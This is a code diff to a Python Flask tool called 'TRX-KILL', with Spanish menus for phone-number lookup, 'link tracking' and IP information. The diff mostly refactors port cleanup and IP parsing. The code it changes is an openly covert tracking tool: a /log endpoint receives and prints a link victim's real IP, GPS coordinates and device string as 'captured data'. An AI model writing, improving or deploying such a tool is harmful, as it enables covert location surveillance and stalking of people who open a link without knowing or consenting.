@@ -5,14 +5,23 @@ import subprocess
 import re
 import time
 import requests
+import socket
 from flask import Flask, request, render_template_string
 
 app = Flask('TRX-KILL')
 URL_FINAL = "https://www.google.com"
 
+# MÉTODO NATIVO PARA LIMPIEZA DE PUERTO
 def force_clean():
-    os.system('fuser -k 5000/tcp > /dev/null 2>&1')
-    time.sleep(0.5)
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        result = sock.connect_ex(('127.0.0.1', 5000))
+        if result == 0:
+            os.system('pkill -f flask > /dev/null 2>&1')
+            time.sleep(1)
+        sock.close()
+    except:
+        pass
 
 HTML_FINAL = """
 <!DOCTYPE html>
@@ -40,10 +49,7 @@ def index(): return render_template_string(HTML_FINAL)
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    if request.headers.getlist("X-Forwarded-For"):
-        ip = request.headers.getlist("X-Forwarded-For")[0]
-    else:
-        ip = request.remote_addr
+    ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
     print(f"\n\033[1;31m[!] DATOS CAPTURADOS DEL DISPOSITIVO\033[0m")
     print(f"\033[1;32m[*] IP REAL: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m\n")
     return "OK"
@@ -67,7 +73,7 @@ def banner():
 def main():
     while True:
         banner()
-        print("\033[1;33m [1] \033[1;37mINFO NÚMERO\n\033[1;33m [2] \033[1;37mRASTREO (LINK)\n\033[1;33m [3] \033[1;37mCREADOR\n\033[1;33m [4] \033[1;37mLICENCIA Y USO\n\033[1;33m [5] \033[1;37mVERSIÓN\n\033[1;33m [6] \033[1;37mACTUALIZACIÓN\n\033[1;33m [7] \033[1;37mINFORMACIÓN-IP\n\033[1;33m [8] \033[1;37mSALIR")
+        print("\033[1;33m [1] \033[1;37mINFO NÚMERO\n\033[1;33m [2] \033[1;37mRASTREO (LINK)\n\033[1;33m [3] \033[1;37mCREADOR\n\033[1;33m [4] \033[1;37mLICENCIA Y USO\n\033[1;33m [5] \033[1;37mVERSIÓN\n\033[1;33m [6] \033[1;37mACTUALIZACIÓN\n\033[1;33m [7] \033[1;37mINFORMACIÓN-IP\n\033[1;33m [8] \033[1;37mSALIR\033[0m")
         opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
         
         if opc == "1":
